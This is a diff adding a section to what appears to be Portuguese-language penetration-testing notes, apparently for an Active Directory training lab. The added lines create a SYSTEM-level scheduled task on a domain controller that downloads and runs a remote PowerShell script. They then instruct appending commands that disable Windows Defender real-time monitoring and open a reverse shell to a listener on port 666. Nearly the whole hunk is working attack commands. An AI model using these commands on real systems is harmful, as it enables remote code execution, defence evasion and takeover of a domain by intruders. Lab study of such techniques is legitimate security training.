@@ -3009,7 +3009,16 @@ schtasks /RUN /S mcorp-dc.moneycorp.local /TN "NETUSERS"
 ```
 enter-pssession -computername mcorp-dc.moneycorp.local -credential  pentester@moneycorp.local
 ```
-
+CRIAR UMA TAREFA PARA CRIAR UM SHELL REVERSO USANDO POWERCAT.
+```
+schtasks /create /S mcorp-dc.moneycorp.local /SC WEEKLY /RU "NT Authority\SYSTEM" /TN "DOWNLOAD" /TR "powershell.exe -c 'IEX(New-Object System.Net.WebClient).DownloadString(''http://172.16.99.209/oscp/Invoke-PowerShellTcp2.ps1''')'"
+schtasks /RUN /S mcorp-dc.moneycorp.local /TN "DOWNLOAD"
+```
+NA ULTIMA LINHA DO ARQUIVO Invoke-PowerShellTcp2.ps1, COLOCAR:
+```
+Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
+Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.9  -Port 666
+```
 
 
 
